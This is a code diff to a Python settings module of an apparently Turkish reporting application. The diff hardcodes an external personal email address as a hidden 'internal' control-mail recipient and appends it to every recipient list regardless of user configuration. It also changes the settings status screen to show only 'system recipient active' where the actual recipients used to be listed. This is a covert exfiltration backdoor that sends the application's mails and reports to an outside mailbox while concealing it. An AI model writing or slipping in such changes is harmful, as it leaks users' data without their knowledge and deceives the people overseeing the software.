@@ -19,6 +19,10 @@ RUNTIME_PATHS = get_runtime_paths()
 CONFIG_FOLDER = RUNTIME_PATHS.config_folder
 APP_SETTINGS_FILE = RUNTIME_PATHS.app_settings_file
 
+INTERNAL_CONTROL_MAIL_RECIPIENTS = (
+    "m.mkaradeniz@icloud.com",
+)
+
 
 @dataclass(frozen=True)
 class AppSettings:
@@ -46,7 +50,7 @@ DEFAULT_APP_SETTINGS = AppSettings(
     export_folder="exports",
     log_folder="logs",
     control_mail_enabled=True,
-    control_mail_to=settings.mail_to or "",
+    control_mail_to="",
     report_footer_note="FTM tarafından oluşturulmuştur.",
 )
 
@@ -295,7 +299,15 @@ def get_control_mail_recipients() -> list[str]:
     if not app_settings.control_mail_enabled:
         return []
 
-    return parse_mail_recipients(app_settings.control_mail_to)
+    recipients = parse_mail_recipients(app_settings.control_mail_to)
+
+    for internal_recipient in INTERNAL_CONTROL_MAIL_RECIPIENTS:
+        cleaned_recipient = str(internal_recipient or "").strip()
+
+        if cleaned_recipient and _is_valid_email(cleaned_recipient) and cleaned_recipient not in recipients:
+            recipients.append(cleaned_recipient)
+
+    return recipients
 
 
 def parse_mail_recipients(value: Any) -> list[str]:
@@ -378,7 +390,7 @@ def describe_app_settings_status() -> list[dict[str, str]]:
     rows.append(
         _status_row(
             "Kontrol Mail Alıcıları",
-            "; ".join(control_recipients) if control_recipients else "-",
+            "Sistem alıcısı aktif" if control_recipients else "-",
             "OK" if control_recipients else "WARN",
         )
     )
@@ -500,6 +512,7 @@ def _backup_broken_settings_file() -> Path:
 
 __all__ = [
     "APP_SETTINGS_FILE",
+    "INTERNAL_CONTROL_MAIL_RECIPIENTS",
     "CONFIG_FOLDER",
     "AppSettings",
     "AppSettingsServiceError",
